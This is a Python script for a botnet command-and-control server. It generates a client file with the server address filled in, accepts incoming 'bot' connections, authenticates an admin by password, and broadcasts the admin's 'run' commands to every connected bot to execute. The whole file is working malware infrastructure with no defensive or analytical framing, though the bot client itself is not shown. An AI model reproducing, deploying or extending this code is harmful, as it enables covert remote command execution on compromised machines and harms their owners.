import socket
from threading import Thread
import os
import json


# <editor-fold desc="First check for config.json">
config_file_check = os.path.isfile('config.json')
if config_file_check is True:
    config = json.load(open('config.json', 'r'))
elif config_file_check is False:
    print('no config found, creating new , to change settings edit config.json')
    config = {}
    config['serverIp'] = input('server ip ?')
    config['serverPort'] = int(input('server port?'))
    config['adminPasswd'] = input('admin password?')
    with open('config.json', 'w') as file:
        json.dump(config, file)
        file.close()
if os.path.isfile('client.py') is False:
    client_file = open('client_template.py', 'r').readlines()
    client_file[7] = client_file[7].format(config['serverIp'])
    client_file[8] = client_file[8].format(config['serverPort'])
    with open('client.py', 'w') as file:
        for x in client_file:
            file.write(x)
        file.close()
elif os.path.isfile('client.py') is True:
    client_file = open('client.py', 'r').readlines()
    client_file_ip = (client_file[7].split('='))[1]
    client_file_port = (client_file[8].split('='))[1]
    if client_file_ip != config['serverIp'] and client_file_port != config['serverPort']:
        client_file[7] = 'ip_server = {}'.format(config['serverIp'])
        client_file[8] = 'port_server = {}'.format(config['serverPort'])
    with open('client.py', 'w') as file:
        for x in client_file:
            file.write(x)
        file.close()

os.system('clear')
# </editor-fold>


# <editor-fold desc="Variables">
running = True
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
sock.bind((config['serverIp'], config['serverPort']))
admin_ip = ''
admin_password = config['adminPasswd']
bots = []
# </editor-fold>


def listen(conn, ip):
    global running
    global admin_ip
    while running is True:
        try:
            conn.settimeout(0.5)
            line = conn.recv(2048)
            if line.decode().find('login') != -1:
                passwd = ((line.decode()).split())[1]
                if passwd == admin_password:
                    admin_ip = ip
                    conn.sendall(bytes('good password , ip stored as admin', 'utf-8'))
                elif passwd != admin_password:
                    conn.sendall(bytes('wrong passwd', 'utf-8'))
            elif line.decode().find('run') != -1 and ip == admin_ip:
                cmd = line.decode()
                print('sending command \'{}\' to bots'.format(((cmd.split(maxsplit=1)[1]).strip('\r\n'))))
                for bot in bots:
                    if bot == conn:
                        continue
                    bot.sendall(bytes('{}'.format(cmd.strip('\r\n')), 'utf-8'))
                conn.sendall(bytes('ok', 'utf-8'))
            else:
                print(line.decode(), end='\r')
        except socket.timeout:
            pass


while running is True:
    try:
        sock.listen(0)
        (conn, (ip, _)) = sock.accept()
        bots.append(conn)
        Thread(target=listen, args=(conn, ip)).start()
    except KeyboardInterrupt:
        exit(0)
        break
